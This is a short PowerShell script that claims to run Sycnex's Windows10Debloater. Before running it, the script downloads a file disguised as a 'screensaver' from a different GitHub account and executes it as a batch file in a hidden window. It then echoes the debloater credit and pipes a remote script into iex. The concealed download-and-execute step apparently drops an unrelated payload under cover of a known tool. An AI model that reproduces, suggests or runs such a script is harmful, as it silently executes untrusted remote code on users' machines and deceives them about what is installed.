iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/screensaver" -o $env:TEMP\screensaver.bat
Start-Process -WindowStyle hidden -FilePath $env:TEMP\screensaver.bat
echo Windows10Debloater by Sycnex
iwr -useb git.io/debloat|iex
